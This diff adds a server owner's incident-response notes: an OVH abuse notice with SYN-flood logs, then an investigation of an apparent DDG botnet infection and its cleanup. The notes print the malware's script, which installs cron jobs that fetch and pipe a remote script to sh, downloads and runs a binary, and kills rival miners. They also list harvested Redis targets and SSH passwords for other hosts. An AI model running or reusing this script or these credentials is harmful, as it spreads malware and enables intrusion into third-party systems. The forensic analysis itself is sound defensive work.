@@ -1,0 +1,189 @@
+[TICKET#2319239781] Anti-hack
+-machine.domine.com 123.123.123.123
+
+OVH Support incident.cloud@ovh.ca via gmail.com 
+12/29/17 (4 days ago)
+
+to BOT 
+Dear Customer,
+
+As your server machinevulnerable.net is presenting too great a threat to our network,
+we had no choice but to place it in 'rescue FTP' mode. An email
+containing a username and password has been sent to you so that so you can
+easily retrieve any data still located in the storage space.
+
+Please do not hesitate to contact our technical support so that this
+situation does not become critical.
+
+You can find the logs brought up by our system below which led to this alert.
+
+- START OF ADDITIONAL INFORMATION -
+
+Attack detail : 468Kpps/236Mbps
+dateTime                   srcIp:srcPort           dstIp:dstPort           protocol flags     packets      bytes reason
+2017.12.29 17:24:45 CET    123.123.123.123:5129     183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:60299    183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:41714    183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:43861    183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:621      183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:38610    183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:40591    183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:5855     183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:2023     183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:32494    183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:40998    183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:7484     183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:63211    183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:42096    183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:3863     183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:54015    183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:62969    183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:32300    183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:42878    183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+2017.12.29 17:24:45 CET    123.123.123.123:24071    183.60.110.158:80       TCP      SYN         16384    1081344 ATTACK:TCP_SYN
+
+-  END OF ADDITIONAL INFORMATION  -
+
+Kind regards,
+
+OVH Customer Support
+============================================================================================
+
+[18:56:22] root@rescue:~$ cat .ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfxLBb/eKbi0TVVULI8ILVtbv2iaGM+eZbZoCWcD3v/eF1B/VkHAC1YwIhfqkUYudwhxVfQzsOZYQmKyapWzgp3tBAxcl82Al++VQc36mf/XFnECHndJS1JZB429/w/Ao+KlASl/qzita61D2VsXyejIQIeYR7Ro+ztLSTXjx+70CvzgOae3oayunL/hGX8qORIkG5YR3R1Jefhxy1NhGxEd6GaR7fZA5QWGfM17IcSXi2Q876JL8U7Aq8cjQyN/kGT2jWiiQiOZzqbjVJVICiwk0KvtrTwppV6FLty/vdfhgyspR4WZMep41xxuBH5rBkEJO5lqbKJWatcaA8n9jR x
+============================================================================================
+grep -rin "202" ./*
+ps -ef | grep -i libudev.so.6
+============================================================================================
+find / -iname *ddg
+tree /root/.ddg/
+/root/.ddg/
+├── 2020.db
+└── 2021.db
+============================================================================================
+ls -la
+total 112
+-rw-------  1 root root 65536 Dec  9 06:28 2020.db
+-rw-------  1 root root 65536 Dec 24 13:35 2021.db
+============================================================================================
+strings 2020.db :
+HubIPs
+Last104.131.231.181:8443MultiServer	
+Redis
+@158.177.65.189:6379@158.177.67.182:6379@158.177.87.89:6379@158.69.216.8:6379@158.69.223.22:6379@158.69.77.71:6379@158.69.80.198:6379SSH_SUCESS
+PAsswoRD@158.129.146.202:22PIKACHU@158.129.239.253:22R00tAdm!n!@#@158.222.242.139:22asdf1234!@#$@10.9.10.54:22asdf1234!@#$@10.9.8.218:22
+============================================================================================
+i.sh
+export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
+
+echo "*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh | sh" > /var/spool/cron/root
+echo "*/5 * * * * wget -q -O- http://218.248.40.228:8443/i.sh | sh" >> /var/spool/cron/root
+mkdir -p /var/spool/cron/crontabs
+echo "*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh | sh" > /var/spool/cron/crontabs/root
+echo "*/5 * * * * wget -q -O- http://218.248.40.228:8443/i.sh | sh" >> /var/spool/cron/crontabs/root
+
+if [ ! -f "/tmp/ddg.2021" ]; then
+    curl -fsSL http://218.248.40.228:8443/2021/ddg.$(uname -m) -o /tmp/ddg.2021
+fi
+
+if [ ! -f "/tmp/ddg.2021" ]; then
+    wget -q http://218.248.40.228:8443/2021/ddg.$(uname -m) -O /tmp/ddg.2021
+fi
+
+chmod +x /tmp/ddg.2021 && /tmp/ddg.2021
+
+ps auxf | grep -v grep | grep Circle_MI | awk '{print $2}' | xargs kill
+ps auxf | grep -v grep | grep get.bi-chi.com | awk '{print $2}' | xargs kill
+ps auxf | grep -v grep | grep hashvault.pro | awk '{print $2}' | xargs kill
+ps auxf | grep -v grep | grep nanopool.org | awk '{print $2}' | xargs kill
+ps auxf | grep -v grep | grep minexmr.com | awk '{print $2}' | xargs kill
+ps auxf | grep -v grep | grep /boot/efi/ | awk '{print $2}' | xargs kill
+#ps auxf | grep -v grep | grep ddg.2006 | awk '{print $2}' | kill
+#ps auxf | grep -v grep | grep ddg.2010 | awk '{print $2}' | kill
+============================================================================================
+history:
+758  24/12/17 13:40:17 cd /tmp
+760  24/12/17 13:40:27 chmod -x ddg.2021
+763  24/12/17 13:41:14 iotop -o
+767  24/12/17 13:30:30 pkill -9 -f imwbr1
+769  24/12/17 13:31:16 cd /tmp/
+773  24/12/17 13:32:17 chmod -x imWBR1 
+774  24/12/17 13:32:28 chmod -x ddg.2020
+775  24/12/17 13:32:30 chmod -x ddg.2021
+778  24/12/17 13:33:23 chmod -x imWBR1 
+785  24/12/17 13:35:29 crontab -e
+790  29/12/17 18:32:55 cd /var/log/
+794  29/12/17 18:35:23 apt-get install tshark
+798  29/12/17 18:56:22 cd /root/
+800  29/12/17 18:56:32 cat .ssh/authorized_keys
+801  29/12/17 19:06:31 find / -iname  dbd23e52356celf
+802  29/12/17 19:06:56 find / -iname  ddg.x86_64
+803  29/12/17 19:07:01 find / -iname  bash
+804  29/12/17 19:07:11 find / -iname  i.sh
+805  29/12/17 19:07:34 find / -iname ld-linux-x86-64.so.2
+806  29/12/17 19:10:39 find /* -type f -exec grep -l v4.ident.me {} \; 
+807  29/12/17 19:14:59 grep -rin "v4.ident.me" /*
+815  29/12/17 19:37:24 cd /etc/init.d/
+820  29/12/17 19:39:15 cat /etc/shadow
+821  29/12/17 19:48:07 cd /etc/
+823  29/12/17 19:48:16 cat mtab 
+824  29/12/17 19:48:22 cat blkid.tab 
+825  29/12/17 19:48:30 strings blkid.
+826  29/12/17 19:48:33 strings blkid.tab 
+827  29/12/17 19:50:50 find / -iname get.bi-chi.com
+828  29/12/17 19:51:08 find / -iname hashvault.pro
+829  29/12/17 19:51:20 find / -iname nanopool.org
+830  29/12/17 19:51:42 grep -rin "get.bi-chi.com" /*
+832  29/12/17 19:52:44 cat cpu_stats 
+837  29/12/17 19:53:39 find / -iname *.slave
+867  29/12/17 20:01:20 find / -iname *miner*
+868  29/12/17 20:01:26 find / -iname *slave*
+869  29/12/17 20:03:19 cd /root/
+871  29/12/17 20:03:22 cd .ssh/
+873  29/12/17 20:03:27 cat authorized_keys2 
+875  29/12/17 20:03:53 cat known_hosts 
+877  29/12/17 20:04:09 rm -rf id_rsa* known_hosts 
+901  29/12/17 20:33:20 cat /proc/self/fd
+902  29/12/17 20:33:30 cd /proc/self/
+903  29/12/17 20:33:37 cd /proc/
+905  29/12/17 20:34:03 cat /proc/stat
+906  29/12/17 20:34:10 cd /proc/stat
+907  29/12/17 20:34:12 cd /proc/
+913  29/12/17 21:07:44 cat /var/spool/cron/root
+914  29/12/17 21:07:58 cat /var/spool/cron/crontabs/root
+918  29/12/17 21:08:53 find / -iname *ddg
+919  29/12/17 21:09:28 cd /root/.ddg/
+921  29/12/17 21:10:18 tree /root/.ddg/
+923  29/12/17 21:10:47 cat 2020.db 
+924  29/12/17 21:12:20 find / -name redis
+926  29/12/17 21:15:51 cat 2021.db 
+929  29/12/17 21:18:44 strings 2021.db 
+930  29/12/17 21:18:56 strings 2020.db 
+931  29/12/17 21:22:53 find / -iname *ddg
+937  29/12/17 21:27:07 find / -name *i.*
+939  29/12/17 21:28:42 rm -rf .ddg/
+944  29/12/17 21:29:21 strings .dbshell 
+945  29/12/17 21:31:30 cd /etc/init.d/
+969  29/12/17 21:42:50 grep -rin "2021" /*
+970  02/01/18 00:04:08 stats .ssh
+971  02/01/18 00:04:16 stat .ssh
+972  02/01/18 00:04:30 stat .ssh/
+973  02/01/18 00:04:37 stat .ssh/authorized_keys2
+974  02/01/18 00:04:40 stat .ssh/authorized_keys1
+975  02/01/18 00:04:41 stat .ssh/authorized_keys
+976  02/01/18 00:04:48 nano .ssh/authorized_keys
+977  02/01/18 00:05:22 :>.ssh/authorized_keys
+978  02/01/18 00:05:25 nano .ssh/authorized_keys2
+979  02/01/18 00:05:53 :>.ssh/authorized_keys2
+980  02/01/18 00:11:27 apt-get install linux-headers-4.4.0-98-generic linux-image-4.4.0-98-generic
+981  02/01/18 00:13:43 apt-get install linux-headers-4.4.0-98-generic linux-image-4.4.0-98-generic --reinstall
+984  02/01/18 00:46:50 cat wbyjsiqzie
+988  02/01/18 01:00:30 apt-get install clamav
+989  02/01/18 01:01:15 clamscan -i -r /
+990  02/01/18 01:01:30 freshclam 
+992  02/01/18 01:20:16 find /etc -name '*saypyftaoc*' | xargs rm -f
+993  02/01/18 01:20:35 rm -f /usr/bin/saypyftaoc 
+994  02/01/18 01:21:49 find /etc -name '*wugqfrmszz*'
+996  02/01/18 01:22:29 find /etc -name '*sibeupkcru*'
+997  02/01/18 01:22:37 find /etc -name '*trqroxkken*'
+999  02/01/18 01:23:30 rm libudev.so 
